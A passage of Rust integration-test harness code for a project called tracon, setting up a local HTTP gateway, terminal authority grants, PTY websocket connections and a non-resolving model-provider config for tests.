            row.harness_session_id = Some(api.session_id.clone());
            store.insert_session(&row).unwrap();
            manager
                .register_native_api_for_test(&session_id, api.clone())
                .await;
            let app = tracon::http::router(AppState {
                manager,
                cfg,
                adapter: Arc::new(FakeAdapter {
                    tx: Arc::new(tokio::sync::Mutex::new(None)),
                    tokens: Arc::new(tokio::sync::Mutex::new(0)),
                }),
                node_id: "n1".into(),
                tools,
                mesh: None,
                auth: Arc::new(AuthState::new("127.0.0.1".into(), None)),
                enroll: Default::default(),
            });

            let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
            let addr = listener.local_addr().unwrap();
            let served = app.clone();
            tokio::spawn(async move {
                let _ = axum::serve(
                    listener,
                    served.into_make_service_with_connect_info::<SocketAddr>(),
                )
                .await;
            });

            Self {
                container,
                app,
                store,
                session_id,
                api,
                handle: Some(handle),
                runner,
                addr,
            }
        }

        pub fn workspace(&self) -> &str {
            &self.api.directory
        }

        pub fn origin(&self) -> String {
            format!("http://{}", self.addr)
        }

        pub fn grant(&self) {
            self.store
                .authority_grant_insert(&AuthorityGrantRow {
                    id: uuid::Uuid::now_v7().to_string(),
                    action: "terminal".into(),
                    verdict: "allow".into(),
                    target: tracon::authority::terminal_target(
                        &self.session_id,
                        &self.api.directory,
                    ),
                    channel: CHANNEL.into(),
                    session_id: Some(self.session_id.clone()),
                    revision: None,
                    expires_ms: Some(now_ms() + 600_000),
                    revoked_ms: None,
                    reason: "the operator opened a terminal for this session".into(),
                    created_ms: now_ms(),
                })
                .unwrap();
        }

        pub fn events_of(&self, kind: &str) -> Vec<Value> {
            self.store
                .events_after(&self.session_id, 0, 500)
                .unwrap()
                .into_iter()
                .filter(|e| e.kind == kind)
                .map(|e| e.payload)
                .collect()
        }

        pub async fn gateway(
            &self,
            method: &str,
            tail: &str,
            body: Option<Value>,
        ) -> (StatusCode, Value) {
            self.gateway_with(method, tail, body, &[]).await
        }

        pub async fn gateway_with(
            &self,
            method: &str,
            tail: &str,
            body: Option<Value>,
            headers: &[(&str, &str)],
        ) -> (StatusCode, Value) {
            let mut b = Request::builder()
                .method(method)
                .uri(format!("/api/opencode/{}/{tail}", self.session_id))
                .header("host", "127.0.0.1:7420");
            for (k, v) in headers {
                b = b.header(*k, *v);
            }
            if body.is_some() {
                b = b.header("content-type", "application/json");
            }
            let mut req = b
                .body(match body {
                    Some(v) => Body::from(v.to_string()),
                    None => Body::empty(),
                })
                .unwrap();
            req.extensions_mut()
                .insert(ConnectInfo(LOCAL.parse::<SocketAddr>().unwrap()));
            let res = self.app.clone().oneshot(req).await.unwrap();
            let status = res.status();
            let bytes = axum::body::to_bytes(res.into_body(), 1 << 20)
                .await
                .unwrap();
            let text = String::from_utf8_lossy(&bytes).to_string();
            (
                status,
                serde_json::from_str(&text).unwrap_or(Value::String(text)),
            )
        }

        pub async fn connect(
            &self,
            pty: &str,
            ticket: &str,
            origin: &str,
        ) -> Result<
            tokio_tungstenite::WebSocketStream<
                tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>,
            >,
            tungstenite::Error,
        > {
            use tungstenite::client::IntoClientRequest;
            let url = format!(
                "ws://{}/api/opencode/{}/pty/{pty}/connect?ticket={ticket}",
                self.addr, self.session_id
            );
            let mut request = url.into_client_request().unwrap();
            request
                .headers_mut()
                .insert("origin", origin.parse().unwrap());
            tokio_tungstenite::connect_async(request)
                .await
                .map(|(socket, _)| socket)
        }

        pub async fn stop(mut self) {
            if let Some(handle) = self.handle.take() {
                handle.close().await.ok();
            }
            let _ = self.runner.kill(&self.container).await;
        }
    }

    /// Pointed at a gateway host that does not resolve: nothing here calls a
    /// model, and an accidental call must fail rather than reach anything.
    fn wiring() -> tracon::gateway::model::Wiring {
        let mut cfg = Config::default();
        cfg.providers.clear();
        cfg.providers.insert(
            "anthropic".into(),
            tracon::config::Provider {
                credential: "anthropic".into(),
                upstream: "https://api.anthropic.com".into(),
                shape: tracon::config::SHAPE_ANTHROPIC.into(),
                models: vec![tracon::config::ModelDecl {
                    id: "claude-x".into(),
                    context: 200_000,
                    output: 64_000,
                    ..Default::default()
                }],
                ..Default::default()
            },
        );
        tracon::gateway::model::harness_wiring(&cfg, "tracon-gw", "session-token", |_, _| true)
    }

    pub struct LiveRunner {
        pub binary: String,
    }

    #[async_trait]
    impl Runner for LiveRunner {
        async fn spawn(&self, mut cmd: RunnerCommand) -> Result<Spawned, RunnerError> {
            cmd.argv[0] = self.binary.clone();
            tracon::runner::local::LocalRunner.spawn(cmd).await
        }

        async fn run_capture(
            &self,
            mut cmd: RunnerCommand,
        ) -> Result<std::process::Output, RunnerError> {
            cmd.argv[0] = self.binary.clone();
            cmd.workdir = None;
            tracon::runner::local::LocalRunner.run_capture(cmd).await
        }

        async fn kill(&self, name: &str) -> Result<(), RunnerError> {
            tracon::runner::local::LocalRunner.kill(name).await
        }
    }
}
